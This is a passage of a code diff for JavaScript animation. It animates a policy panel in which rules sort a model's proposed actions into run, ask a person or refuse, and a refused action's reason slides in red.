-      // to the model), ask a person; the ASK row's line then runs to Maya's phone, which glows violet
+      // rule lights up in its verdict's color as its tag pops: run, ask a person (the ASK row's line then runs to
+      // Maya's phone, which glows violet), refuse (its reason slides in, in red: it goes back to the model)
       const policyIn = P(t, c[4] + T4.policy, 0.7);
       place(s.policy, POLICY.x + Math.round(120 * (1 - policyIn)), POLICY.y, 1, policyIn);
       s.policy.rows.forEach((row, i) => {
@@ -694,7 +795,13 @@
         row.style.background = lit > 0 ? `rgba(${rgb},${(0.1 * lit).toFixed(3)})` : C.bg;
         row.style.boxShadow = glowShadow(rgb, win(t, litAt, litAt + 0.6, 0.2), { blur: 26, alpha: 0.5 });
         popScale(row.tag, popIn(t, litAt));
-        if (kind === 'alarm') row.note.style.color = lit > 0.5 ? C.red : C.slate;
+        if (kind === 'alarm') {
+          const reason = row.lines[row.lines.length - 1];
+          const reasonIn = P(t, c[4] + T4.reason, 0.3);
+          reason.style.color = C.red;
+          reason.style.opacity = reasonIn;
+          reason.style.transform = `translateX(${Math.round(-16 * (1 - reasonIn))}px)`;
+        }
       });
       const linkAt = c[4] + T4.link;
       const linked = P(t, linkAt, T4.linkD, linear);
